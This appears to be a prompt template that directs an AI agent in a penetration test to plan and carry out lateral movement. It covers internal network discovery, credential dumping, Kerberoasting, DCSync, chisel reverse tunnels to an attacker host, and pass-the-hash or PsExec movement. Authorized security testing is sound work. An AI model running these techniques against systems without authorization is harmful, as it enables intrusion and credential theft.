---
description: Plan and execute lateral movement
---
Plan lateral movement from current position. Context: $ARGUMENTS

Current hosts and access levels:
!`nyx-memory notes_read hosts 2>/dev/null || echo "No hosts documented"`

Current credentials:
!`nyx-memory notes_read credentials 2>/dev/null || echo "No credentials"`

Current attack path:
!`nyx-memory notes_read attack_path 2>/dev/null || echo "No attack path yet"`

## Internal Network Discovery

From the compromised host, map what's reachable:
```
ip addr && ip route && arp -a
netstat -ant | grep ESTABLISHED
cat /etc/resolv.conf
```

Scan newly discovered internal ranges:
```
nyx-log nmap -sn $INTERNAL_RANGE -oX internal_discovery.xml
```
Then `ingest_tool_output` on the results to auto-register discovered hosts.

Identify high-value targets:
- Domain controllers (88/389/636)
- File servers (445)
- Database servers (1433/3306/5432/1521)
- Jump boxes / bastion hosts
- Management interfaces (iLO, iDRAC, vCenter)
- CI/CD, source control, secrets management

Use `host_discover` for every new host found. Use `host_update` to note what makes high-value targets interesting.

## Credential Operations

- Test all obtained credentials against newly discovered services
- `credential_add` for every new credential, noting source and what it's valid on
- Password spraying (only if explicitly authorized — confirm with me first)
- If Active Directory:
  - Kerberoasting: `nyx-log impacket-GetUserSPNs`
  - AS-REP roasting: `nyx-log impacket-GetNPUsers`
  - DCSync if domain admin obtained
- Dump cached/stored creds from current host
- Check for credential reuse patterns

## Tunneling & Pivoting Setup

Select appropriate tunneling based on the environment:
- **chisel**: `chisel server -p 8080 --reverse` / `chisel client $ATTACKER:8080 R:socks`
- **ligolo-ng**: for more complex multi-hop scenarios
- **SSH**: `-L`, `-R`, `-D` port forwarding for simple cases
- **proxychains**: configure for tool routing through tunnels

Verify tunnel stability before running scans through it.

## Lateral Movement Execution

Select technique based on available credentials and target services:
- **PsExec/SMBExec/WMIExec** (impacket) — for Windows with NTLM hash or password
- **WinRM/Evil-WinRM** — for Windows with plaintext creds
- **SSH** — for Linux with keys or passwords
- **Pass-the-Hash / Pass-the-Ticket** — for Kerberos environments
- **RDP** — for interactive access needs

Wrap execution with `nyx-log`. Verify access and immediately document.

## Documentation

- `host_discover` / `host_update` for every newly reached host
- `credential_add` for every credential obtained
- `finding_add` for access gained on each new host
- `attack_path_update` for each lateral movement step — build the story
- `evidence_save` for tunnel configs, screenshots, and proof of access
- `todo_add` for hosts discovered but not yet accessed
- `dead_end_log` for movement attempts that failed
